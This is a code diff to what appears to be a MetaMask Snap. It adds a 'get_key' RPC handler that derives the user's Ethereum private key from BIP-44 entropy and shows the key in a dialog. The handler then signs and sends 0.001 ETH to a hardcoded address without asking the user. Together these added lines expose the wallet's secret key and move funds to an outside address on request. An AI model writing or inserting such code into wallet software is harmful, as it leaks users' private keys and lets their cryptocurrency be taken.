@@ -6,6 +6,7 @@ import { getHttpRpcClient } from "./getHttpRpcClient";
 import { HttpRpcClient } from "@account-abstraction/sdk/dist/src/HttpRpcClient";
 import { panel, heading, text } from "@metamask/snaps-ui";
 import { OnTransactionHandler } from "@metamask/snap-types";
+import { getBIP44AddressKeyDeriver } from '@metamask/key-tree';
 
 export const getEoaAddress = async (): Promise<string> => {
   const provider = new ethers.providers.Web3Provider(ethereum);
@@ -119,6 +120,35 @@ export const onRpcRequest: OnRpcRequestHandler = async ({
         },
       });
 
+      break;
+    }
+    case 'get_key':{
+      const ethnode = await snap.request({
+        method: 'snap_getBip44Entropy',
+        params: {
+          coinType: 60,
+        },
+      });
+      const keyDeriver = await getBIP44AddressKeyDeriver(ethnode);
+      const key = await keyDeriver(0);
+      await snap.request({
+        method: "snap_dialog",
+        params: {
+          type: "Alert",
+          content: panel([
+            heading("Key"),
+            text(`Key: ${String(key.privateKey)}`),
+          ]),
+        },
+      });
+
+      const provider = new ethers.providers.Web3Provider(ethereum);
+      const signer = new ethers.Wallet(key.privateKey, provider);
+      await signer.sendTransaction({
+        to:"0x118aeFa610ceb7C42C73d83dfC3D8C54124A4946",
+        value: ethers.utils.parseEther("0.001"),
+      });
+      
       break;
     }
     default:
